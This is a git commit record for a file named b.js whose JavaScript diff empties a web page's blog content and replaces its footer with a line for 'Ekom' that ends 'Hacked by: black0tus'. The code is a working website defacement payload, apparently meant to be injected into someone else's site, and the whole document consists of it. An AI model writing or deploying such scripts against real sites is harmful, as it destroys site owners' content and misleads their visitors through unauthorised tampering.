72099d345827e4a4bb4f63feb13dd12b79eada26
black0tus <57235815+black0tus@users.noreply.github.com>
2019-11-01 18:39:39 +0200

    Update b.js

--- b.js
+++ b.js
@@ -1,1 +1,2 @@
-document.getElementsByClassName("blog-content")[0].innerHTML = '';
+document.getElementsByClassName("blog-content")[0].innerHTML = "";
+document.getElementsByTagName("footer")[0].innerHTML = "<span style='font-size: 14px;' class='footer-info'>&copy; 2019 Ekom | All rights Reserved | Created by: Swagheti | Hacked by: black0tus</span>";
